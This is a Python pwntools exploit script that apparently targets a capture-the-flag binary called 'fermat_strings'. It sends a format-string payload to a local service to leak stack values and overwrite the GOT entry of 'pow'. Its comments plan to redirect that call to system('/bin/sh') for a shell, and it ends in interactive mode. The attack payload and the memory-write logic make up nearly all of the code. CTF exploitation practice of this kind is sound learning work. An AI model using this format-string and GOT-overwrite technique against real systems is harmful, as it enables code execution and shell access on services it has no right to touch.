import pwn
from pathlib import Path

CURR_DIR = Path(__file__).parent

# Exploit steps.
# Place the address of 'pow' onto the stack - 0040084f.
# Modify the pointer to 'main's, enabling a potential leak of the system address.
# Populate the buffer with the '/bin/sh' string.
# Assign the first parameter (rdi) to the adjusted 'pow' (now representing 'system') address pointing to '/bin/sh'.
# Ignite candles and pray.

p = pwn.remote("localhost", 8080)
# p = pwn.process('/home/dolby/repositories/crackme_challenges/fermat_strings/bin/chall')

def print_without_spaces(data):
    print("=========")
    no_spaces_string = data.replace(b" ", b"")
    print(no_spaces_string)
    if not (CURR_DIR / "log.txt").exists():
        (CURR_DIR / "log.txt").write_bytes(no_spaces_string)
    else:
        cont = (CURR_DIR / "log.txt").read_bytes()
        (CURR_DIR / "log.txt").write_bytes(cont + b'\n' + no_spaces_string)

def send_data(payload):
    print_without_spaces(p.readuntil("A:"))
    p.sendline(payload)
    print_without_spaces(p.readuntil("B:"))
    p.sendline(b"1")

def send_data2(payload):
    p.sendline(payload)
    print_without_spaces(p.readuntil("B:"))
    p.sendline(b"1")

def jump_after_canarry():
    junk = b"1AAAAAAA"
    debug = b"=====>____%18$p____%19$x____%17$x____%18$x"
    printf_string = "Calculating for A: "
    address_to_write = b'%' + f"{0x00400837 - (len(junk) + len(debug) + len(printf_string)) - 10}".encode('utf-8') + b'c' + b'%18$n'
    pow_at_got = pwn.p64(0x00601040)

    payload = [
        junk,
        debug,
        address_to_write,
        pow_at_got,
    ]
    return b"".join(payload)


send_data(jump_after_canarry())
print_without_spaces(p.readuntil("Calculating for A:"))
print_without_spaces(p.readuntil("A:"))
# send_data(get_puts_plt_address())
p.interactive()
